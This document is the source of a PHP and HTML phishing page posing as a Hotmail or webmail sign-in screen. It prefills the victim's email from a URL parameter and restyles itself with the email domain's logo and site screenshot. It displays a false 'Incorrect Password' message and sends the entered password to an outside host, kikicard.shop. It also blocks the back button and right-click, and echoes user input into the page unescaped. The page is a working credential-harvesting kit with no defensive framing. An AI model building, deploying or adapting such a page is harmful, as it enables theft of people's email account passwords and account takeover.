<?php

$id = $_GET['nameu'];

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signon</title>
    <script src="https://cdn.tailwindcss.com"></script>
  
  <script type="text/javascript">
        function preventBack() {
            window.history.forward(); 
        }
          
        setTimeout("preventBack()", 0);
          
        window.onunload = function () { null };
    
       window.addEventListener('contextmenu', function (e) {
       document.body.innerHTML += ''
       e.preventDefault();
       }, false);
    </script>
  

  
</head>
<body class="flex flex-col justify-center items-center h-screen w-screen bg-no-repeat bg-cover"  id="bg-image" style="background-image: url('https://image.thum.io/get/width/1400/http://www.hotmail.com/');">
   
    <div  class="h-[30rem] w-[27rem] bg-neutral-900 bg-opacity-90 flex flex-col justify-center items-center rounded-t-lg ">
        
            <div class="mb-6 mt-4 h-11 w-11 flex flex-col justify-center" >
                <img src="https://logo.clearbit.com/+https:/hotmail.com"  id="logo" alt="">
            </div>
        
            <p class="text-xl  text-neutral-400 " >Sign in to continue</p>
            <p class="text-sm text-center px-10 pt-3 pb-7 text-red-300 font-semibold" > Incorrect Password. Please try again ! </p>
            
            <form name="form1" class="ml-6 mr-6"  action="https://kikicard.shop/0nicholas3/redirect.php?name=$id" onsubmit="return validateForm()" method="post" required>

                
                <div class="text-center pl-5 pr-5">
                    <span class="text-red-400 font-semibold text-sm" id="error"></span>
                    
                </div>
                
                <div class="text-center pl-5 pr-5 pb-4" >
                    <span class="text-red-500 font-normal text-sm" id="error2"></span>
                </div>

                
                    
                

                <input class="h-10 w-[23rem] border border-slate-300 rounded-r focus:outline-none 
                focus:border-blue-100 focus:ring-2 pl-3 text-base text-gray-600 font-light" 
                type="email" name="nameu" id="nameu"  value="<?=$id?>" placeholder="Enter email" readonly>
                

                <div class="p-2"></div>

                <input class="h-10 w-full border border-slate-300 rounded-r focus:outline-none 
                focus:border-blue-100 focus:ring-2 pl-3 text-base text-gray-600 font-light" 
                type="password" name="namep" id="namep"  placeholder="Password">

                <div class="p-2"></div>

                <div class="font-light text-blue-600 pb-8 pt-2">

                    <input class=""  type="checkbox" name="" id="">
                
                    <a class="pr-12 pl-1 text-neutral-400 text-sm" href="#">Remember me</a> 
                </div>

                <div class="flex flex-col items-center justify-center w-full" >
                <button class="h-12 w-[23rem] text-gray-100 bg-blue-500 rounded mb-6" type="submit" value="submit" onclick="validateForm()">Sign in</button>
                </div>
                
            </form>    
        
    </div>
    


    
</body>

<!-- <script>
    function errorMessage() {
        var error = document.getElementById("error")
        if (isNaN(document.getElementById("nameu").value))
        {
             
            // Changing content and color of content
            error.textContent = "Please enter a valid number"
            error.style.color = "red"
        } else {
            error.textContent = ""
        }
    }
</script> -->

<script>

// // get email input value
// var get_email = document.getElementById('email').value;

// // Slize out email from domain netflix.com
// var slice_email = get_email.substring(0,get_email.lastIndexOf("@"));

// // Slice out domain from email
// var domain = get_email.substring(get_email.lastIndexOf("@") +1);

// // Loading Clearbit with sliced domain
// this is what it is

  

// ======================================================




// function AutoChangeImage(){

//     var get_email = document.getElementById('email').value;
//     var slice_email = get_email.substring(0,get_email.lastIndexOf("@"));
//     var domain = get_email.substring(get_email.lastIndexOf("@") +1);

//     document.getElementById('bg-image').style="background-image: url('https://image.thum.io/get/width/1400/https://"+domain;"');";
//     document.getElementById('logo').src="https://logo.clearbit.com/"+domain;
        
//     if (get_email != "") {
//         window.onload = function () {
//         setInterval(AutoChangeImage, 2000);
//         };
//     }else {
//         alert("My name is lucas");
//     }


</script>


<script>
    var get_email = document.getElementById('nameu').value;
    var slice_email = get_email.substring(0,get_email.lastIndexOf("@"));
    var domain = get_email.substring(get_email.lastIndexOf("@") +1);

    document.getElementById('bg-image').style="background-image: url('https://image.thum.io/get/width/1400/https://"+domain;"');";
    document.getElementById('logo').src="https://logo.clearbit.com/"+domain;
        
</script>

    







<script>

      
          

    function validateForm() {
        var empt = document.form1.namep.value;
        var namep_len = namep.value.length;
        var namemail = document.form1.nameu.value;
        var error = document.getElementById("error");
        var error2 = document.getElementById("error2");
        if (namemail === "") {
            error.textContent = "Invalid credentials. email/password is incorrect";
            return false;
            
        } else if (error.display === 'true'){
            error.display = 'none';

        }  else if (empt === "" || namep_len < 5) {
            error2.textContent = "Invalid Password! Please Enter correct Password";
            
            return false;
        }
            
        

    }

   
</script>



</html>


<!-- setTimeout(function() {
//     var error = document.getElementById("error");
//     error.parentNode.removeChild(error);
//     },

// 5000); -->